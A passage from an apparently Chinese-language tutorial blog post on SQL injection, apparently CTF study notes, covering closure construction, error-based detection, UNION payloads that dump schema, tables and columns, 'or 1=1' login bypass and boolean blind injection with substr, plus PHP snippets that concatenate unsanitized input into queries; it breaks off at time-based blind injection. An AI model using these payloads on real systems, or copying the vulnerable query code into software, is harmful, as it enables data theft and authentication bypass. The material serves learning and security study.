class="hljs-function"><span class="hljs-params">(column_username)</span>--&gt;</span>username<br>+ + - 列_password <span class="hljs-function"><span class="hljs-params">(column_password)</span>--&gt;</span>password<br>+ + + - 数据<br>+ + + - 数据<br></code></pre></td></tr></table></figure><h2 id="常用语法"><a href="#常用语法" class="headerlink" title="常用语法"></a>常用语法</h2><p><code>SECLECT</code></p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> 列名<span class="hljs-number">1</span>, 列名<span class="hljs-number">2</span>, ... <span class="hljs-keyword">from</span> 表名 <span class="hljs-keyword">where</span> 条件<br></code></pre></td></tr></table></figure><p><code>UNION</code></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> 列名<span class="hljs-number">1</span> <span class="hljs-keyword">from</span> 表名<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> 列名<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> 表名<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>使用 <code>union</code> 的时候两个表列数必须相同</p><p><code>Order by</code></p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> column1, column2, ... <span class="hljs-keyword">from</span> table_name [<span class="hljs-keyword">where</span> condition] <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> column_name<br></code></pre></td></tr></table></figure><p>一般用来判断列数，比如说</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs s">select column1，column2 from table_name order by 1;//不报错<br>select column1，column2 from table_name order by 2;//不报错<br>select column1，column2 from table_name order by 3;//报错<br>//说明只有2列<br></code></pre></td></tr></table></figure><h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><p><code>user()</code>：当前数据库用户</p><p><code>database()</code>：当前数据库名</p><p><code>concat()</code>：联合数据，用于联合两条数据。比如 <code>concat(username,0x30,password)</code> 将 <code>username</code> 和 <code>password</code> 通过 <code>:</code> 连接起来</p><p><code>group_concat</code>：和 <code>concat</code> 类似，用于把多条数据一次注入出来</p><p><code>select xxoo into outfile &#39;路径&#39;</code>：权限较高时可直接写文件</p><h1 id="基本注入类型"><a href="#基本注入类型" class="headerlink" title="基本注入类型"></a>基本注入类型</h1><h2 id="注入类型判断"><a href="#注入类型判断" class="headerlink" title="注入类型判断"></a>注入类型判断</h2><p>SQL 处理语句后台的写法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> username,password from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span> = ?<br></code></pre></td></tr></table></figure><p><code>?</code> 这里有多种闭合方式，比如:<code>$id</code>，<code>&#39;$id&#39;</code>，<code>“$id”</code>，<code>($id)</code></p><p>然后<strong>构造闭合</strong>，其实这个词我也不太懂，看了一下探姬师傅的 hello-ctf 上的解释，是这样的：</p><p>比如后台为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> username,password from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$id</span>&quot;</span><br></code></pre></td></tr></table></figure><p>那么我们使传入的 <code>$id=&#39;1&quot;&#39;</code> ，后台执行则为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> username,password from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;1&quot;</span><span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p>在这里对 <code>1</code> 完成了闭合构造，但是闭合了前序导致后续的 <code>&quot;</code> 没有双引号配对，多出来的这个双引号就会导致报错：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1064 </span>- You have an <span class="hljs-keyword">error</span> in your SQL syntax; check the manual that corresponds <span class="hljs-keyword">to</span> your MySQL server version <span class="hljs-keyword">for</span> the right syntax <span class="hljs-keyword">to</span> use near <span class="hljs-comment">&#x27;&quot;&#x27; at line 1</span><br></code></pre></td></tr></table></figure><p>所以通常在构造完闭合后去注释掉后面的符号，比如使用 <code>#</code>,<code>--</code></p><h3 id="是否报错判断"><a href="#是否报错判断" class="headerlink" title="是否报错判断"></a>是否报错判断</h3><p><code>&quot;1&#39;&quot;</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> username,password from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span> = <span class="hljs-string">&quot;1&#x27;&quot;</span><br>// <span class="hljs-string">&quot;&quot;</span> 中为可以包含 <span class="hljs-string">&#x27;,而 1&#x27;</span>是一个合法字符串，在查询时会先被强制类型转换为数字，不会报错<br></code></pre></td></tr></table></figure><p><code>1&#39;</code></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> uders <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">// 因为这里的&#x27;</span>没有闭合，会报错<br></code></pre></td></tr></table></figure><p><code>&#39;1&#39;&#39;</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> username,password from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span> = <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">// &#x27;</span>与前面的<span class="hljs-string">&#x27;闭合了,但是剩了一个 &#x27;</span>，会报错<br></code></pre></td></tr></table></figure><h3 id="报错信息判断"><a href="#报错信息判断" class="headerlink" title="报错信息判断"></a>报错信息判断</h3><p><code>1&quot;</code></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">执行：id = <span class="hljs-string">&quot;1&quot;</span><span class="hljs-comment">&quot;</span><br>报错：near <span class="hljs-string">&#x27;&quot;1&quot;&quot;&#x27;</span> at <span class="hljs-built_in">line</span> <span class="hljs-number">1</span><br>//去掉外层 SQL 的单引号，留下 <span class="hljs-string">&quot;1&quot;</span><span class="hljs-comment">&quot;,可以判断出是双引号的字符型注入</span><br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL1.png"></p><p><code>1&#39;</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">执行：<span class="hljs-built_in">id</span> = <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">报错：near &#x27;</span>1<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27; at line 1</span><br><span class="hljs-string">// 去掉外层留下 &#x27;</span>1<span class="hljs-string">&#x27;&#x27;</span>,再除去注入的 1<span class="hljs-string">&#x27;,可以判断出是单引号的字符型注入</span><br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL2.png"></p><p><code>&#39;1</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">执行：<span class="hljs-built_in">id</span> = <span class="hljs-string">&#x27;&#x27;</span>1<span class="hljs-string">&#x27;</span><br><span class="hljs-string">报错：near &#x27;</span><span class="hljs-string">&#x27;1&#x27;</span> at line 1<br>// 对于 SQL,<span class="hljs-built_in">id</span> = <span class="hljs-string">&#x27;&#x27;</span>已经闭合，所以 1<span class="hljs-string">&#x27; 成为了报错点</span><br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL3.png"></p><h2 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);<br><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$conn</span>,<span class="hljs-string">&quot;select username from users where id=&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br><span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_array</span>(<span class="hljs-variable">$res</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;username&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>根据用户输入 id，查询用户信息。用户的输入 id 字段，没有任何过滤地被直接拼接在了 sql 查询语句中。由于 id 没有被引用包裹，而且类型为数字，此为数字型注入。</p><p>可以使用在语句中加入运算符来测试这种注入是否存在</p><p>sql 关键字 <strong>union</strong>，将两个 select 语句结果合并到一个结果集中，但要求两个 select 语句拥有相同的列数。</p><p>使用联合查询 <code>union</code> 基于 <code>information_schema</code> 拿到数据库名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">schema_name</span> <span class="hljs-keyword">from</span> information_schema.schemata;<br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL4.png"></p><p>以把 1 换成其他的，比如 <code>database()</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>(),<span class="hljs-built_in">schema_name</span> <span class="hljs-keyword">from</span> information_schema.schemata;<br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL5.png"></p><p><strong>空格的 url 编码是 %20</strong>，如果要查询其他行，还需要使用 **limit **关键字。</p><p>使用联合查询去得到数据库的表名，先获取当前库（<code>database()</code>）</p><p>基于 <code>UNION</code> <code>GROUP_CONCAT(table_name)</code> 和 <code>information_schema.tables</code> 查询</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>),<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema = <span class="hljs-keyword">database</span>();<br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL6.png"></p><p>获取 表 的对应字段名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>),<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema = <span class="hljs-keyword">database</span>();<br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL7.png"></p><h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);<br><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$conn</span>,<span class="hljs-string">&quot;select id from users where username=&#x27;&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&quot;&#x27;&quot;</span>);<br><span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_array</span>(<span class="hljs-variable">$res</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>通过 username 查询 id，而且用户输入的 username 被单引号包裹起来了。所有用户的所有输入都会被当成字符串处理，无法将之前的数字型注入的 payload 进行注入了。如果输入中有一个引号，就可以将前面的引号闭合，使得后面的内容从字符串中逃逸出来。最后将后面的引号注释掉。</p><p><strong>首先就需要构造单引号的闭合</strong></p><p>使用一个单引号将字符串闭合，在输入 sql 语句，最后用 # 号将后面的单引号注释掉。</p><p>比如：<strong>username &#x3D; ‘or 1&#x3D;1 #</strong>,</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">select id <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>where <span class="hljs-attribute">username</span>=<span class="hljs-string">&#x27;&#x27;</span>or <span class="hljs-attribute">1</span>=1 #;<br></code></pre></td></tr></table></figure><p>在 where 语句中，or 连接两个表达式，第一个返回假第二个返回真，or 操作后返回真，整个操作返回所有的结果集。</p><p><code>username=-1’ or ‘1’=‘1’ --</code></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span> -- <span class="hljs-string">&#x27; and password = &#x27;</span>$<span class="hljs-keyword">password</span><span class="hljs-string">&#x27;;</span><br></code></pre></td></tr></table></figure><p>这样就直接可以使 <code>where</code> 条件为<strong>永真</strong>，直接输出 <code>select * from user</code> 的所有内容</p><p><img src="/2024/11/06/TestWP/QL8.png"></p><p><code>order by</code> 判断函数</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">1</span><span class="hljs-comment">-- &#x27; and password = &#x27;$password&#x27;;</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">2</span><span class="hljs-comment">-- &#x27; and password = &#x27;$password&#x27;;</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span><span class="hljs-comment">-- &#x27; and password = &#x27;$password&#x27;;</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">4</span><span class="hljs-comment">-- &#x27; and password = &#x27;$password&#x27;;//报错</span><br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL9.png"></p><p>库名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">schema_name</span>,<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.schemata;<span class="hljs-comment">-- &#x27; and password = &#x27;$password&#x27;;</span><br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL10.png"></p><p>表名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>),<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-comment">-- &#x27; and password = &#x27;$password&#x27;;</span><br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL11.png"></p><p>字段名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>),<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-comment">-- &#x27; and password = &#x27;$password&#x27;;</span><br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL12.png"></p><h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><p>顾名思义就是服务器不显示查询结果，只返回是否查询成功时，无法使用 union 直接回显数据，需要盲注。盲注有时间盲注和布尔盲注。</p><p>例句</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">$sql = &quot;<span class="hljs-keyword">SELECT</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id = <span class="hljs-string">&quot;.$_GET[&quot;</span>id<span class="hljs-string">&quot;];</span><br></code></pre></td></tr></table></figure><p>有时候防火墙拦截过滤了 and 但 or 可能没有被过滤拦截，那就可以用 or 来进行盲注</p><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>比如 id 传参是</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">id</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span> and <span class="hljs-number">1</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>执行语句：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span> = <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL13.png"></p><p>这里要求两个条件为真，一是有 <code>id=1</code>，二是 <code>1=1</code>。</p><p>如果 输入<code>1=2</code>，并不会有回显，返回为空，因为 <code>and</code> 后面的条件并不满足。</p><p>所以可以利用此特点来获取其他信息：</p><h3 id="length-获取长度信息"><a href="#length-获取长度信息" class="headerlink" title="length()获取长度信息"></a><strong><code>length()</code>获取长度信息</strong></h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">id</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span> and length(username) <span class="hljs-operator">=</span> num<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>利用 <code>length()</code> 函数爆破数据长度</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> username，<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">length</span>(username) =<span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>还可以使用二分</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">id</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span> and length(username)&lt; num<br><span class="hljs-attribute">id</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span> and length(username)&gt; num<br></code></pre></td></tr></table></figure><h3 id="SUBSTR-函数截取字符串"><a href="#SUBSTR-函数截取字符串" class="headerlink" title="SUBSTR()函数截取字符串"></a><strong><code>SUBSTR()</code>函数截取字符串</strong></h3><p><code>substr(string,start,length)</code> 参数依次为：要截取字符串，截取开始位置，截取长度。</p><p>比如注入 admin 的 password，构造这样的输入：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">username</span>=&#x27;or substr(password,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=&#x27;<span class="hljs-number">1</span>&#x27; #;<br></code></pre></td></tr></table></figure><p>实际 sql 语句：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> <span class="hljs-built_in">id</span> from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> username=<span class="hljs-string">&#x27;&#x27;</span> or substr(password,1,1)=<span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-comment">#;</span><br></code></pre></td></tr></table></figure><p>可以不断改变比较的字符，选取所有可显示字符去遍历，当猜中真正的返回值时，服务器返回用户存在。</p><p>除了截取字符串，还能替换某个字符</p><p>将<code>admin</code> 的第 4 到 6 个字符替换为 ***</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">update</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">set</span> username = <span class="hljs-built_in">substr</span>(username,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>)||<span class="hljs-string">&#x27;***&#x27;</span>||<span class="hljs-built_in">substr</span>(username,<span class="hljs-number">7</span>) <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;admin&#x27;</span>;<br></code></pre></td></tr></table></figure><p>在不使用联合注入和回显的方式拿到数据</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">substr</span>((<span class="hljs-keyword">select</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;admin&#x27;</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) = <span class="hljs-string">&#x27;a&#x27;</span>;<br></code></pre></td></tr></table></figure><h3 id="MID-函数截取字符串"><a href="#MID-函数截取字符串" class="headerlink" title="MID()函数截取字符串"></a><strong><code>MID()</code>函数截取字符串</strong></h3><p>与 <code>substr()</code>比较像</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mid</span>(<span class="hljs-string">&quot;butt3rf1y&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>);// 返回 “but”<br><span class="hljs-attribute">substr</span>(<span class="hljs-string">&quot;butt3rf1y&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>);// <span class="hljs-string">&quot;but&quot;</span><br></code></pre></td></tr></table></figure><h3 id="CONCAT-函数拼接字符串"><a href="#CONCAT-函数拼接字符串" class="headerlink" title="CONCAT()函数拼接字符串"></a><strong><code>CONCAT()</code>函数拼接字符串</strong></h3><p>可以减少查询跳转次数</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-function"><span class="hljs-title">concat</span>(<span class="hljs-params">string1,string2,...</span>)</span><br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> concat(username,<span class="hljs-string">&#x27;-&#x27;</span>,<span class="hljs-keyword">password</span>),<span class="hljs-number">1</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>;<br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL14.png"></p><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>利用语句执行时间判断真假</p><h3 id="IF-函数"><a href="#IF-函数" class="headerlink" title="IF() 函数"></a><code>IF()</code> 函数</h3><p>判断指定条件是否成立，根据结果返回不同的值</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 